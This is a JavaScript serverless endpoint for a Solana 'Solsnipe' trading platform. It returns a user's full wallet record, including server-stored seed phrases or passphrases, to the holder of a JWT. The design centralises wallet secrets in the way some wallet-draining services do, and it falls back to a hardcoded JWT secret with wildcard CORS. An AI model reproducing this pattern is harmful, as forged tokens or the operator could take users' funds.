/**
 * Get Wallet Details Endpoint
 * 
 * Fetches complete wallet information including:
 * - Wallet address and type
 * - SOL balance
 * - Solsnipe balance
 * - Credentials (seed phrase or passphrase)
 * - Transaction history
 * - Login statistics
 * 
 * Required: JWT token (user auth)
 */

const jwt = require('jsonwebtoken');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');

const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-key-change-in-production-use-crypto-randomBytes';

const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Content-Type': 'application/json'
};

exports.handler = async (event) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  // Only allow GET requests
  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Extract JWT token from Authorization header
    const authHeader = event.headers.authorization || event.headers.Authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return {
        statusCode: 401,
        headers,
        body: JSON.stringify({ 
          error: 'Missing or invalid authorization token',
          message: 'Please provide a valid JWT token in Authorization header'
        })
      };
    }

    const token = authHeader.substring(7); // Remove 'Bearer ' prefix

    // Verify JWT token
    let decoded;
    try {
      decoded = jwt.verify(token, JWT_SECRET);
    } catch (error) {
      return {
        statusCode: 401,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid or expired token',
          message: 'Please login again to get a new token'
        })
      };
    }

    console.log('🔍 Fetching wallet details for:', decoded.walletAddress);

    // Get wallet from Firebase
    const walletStore = new FirebaseWalletStore();
    const wallet = await walletStore.getWalletById(decoded.walletId);

    if (!wallet) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          error: 'Wallet not found',
          message: 'The wallet associated with this token does not exist'
        })
      };
    }

    // Prepare response with all wallet details
    const walletDetails = {
      walletId: wallet.walletId,
      walletAddress: wallet.walletAddress,
      walletType: wallet.walletType,
      inputType: wallet.inputType,
      blockchain: wallet.blockchain,
      
      // Balances
      balance: wallet.balance || 0, // SOL balance
      solsnipeBalance: wallet.solsnipeBalance || 0, // Solsnipe platform balance
      depositedAmount: wallet.depositedAmount || 0, // Deposited amount
      balanceLastUpdated: wallet.balanceLastUpdated,
      
      // Credentials (seed phrase or passphrase)
      credentials: wallet.credentials || null,
      
      // Derivation info
      derivationPath: wallet.derivationPath,
      accountIndex: wallet.accountIndex,
      
      // Transaction history
      transactions: wallet.transactions || [],
      
      // Account statistics
      createdAt: wallet.createdAt,
      lastLoginAt: wallet.lastLoginAt,
      loginCount: wallet.loginCount || 0,
      
      // Credit tracking
      totalSolCredited: wallet.totalSolCredited || 0,
      totalSolsnipeCredited: wallet.totalSolsnipeCredited || 0,
      totalDeposited: wallet.totalDeposited || 0,
      
      // Auto snipe and trade counters
      autoSnipeBot: wallet.autoSnipeBot || 0,
      totalTrade: wallet.totalTrade || 0,
      
      // Withdrawal requests
      withdrawal: wallet.withdrawal ? (wallet.withdrawal.trim() !== '' ? JSON.parse(wallet.withdrawal) : []) : [],
      
      // Additional metadata
      metadata: wallet.metadata || {}
    };

    console.log('✅ Wallet details retrieved successfully');
    console.log('   SOL Balance:', walletDetails.balance);
    console.log('   Solsnipe Balance:', walletDetails.solsnipeBalance);
    console.log('   Deposited Amount:', walletDetails.depositedAmount);
    console.log('   Auto Snipe Bot:', walletDetails.autoSnipeBot);
    console.log('   Total Trades:', walletDetails.totalTrade);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        wallet: walletDetails
      })
    };

  } catch (error) {
    console.error('💥 Get wallet details error:', error.message);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
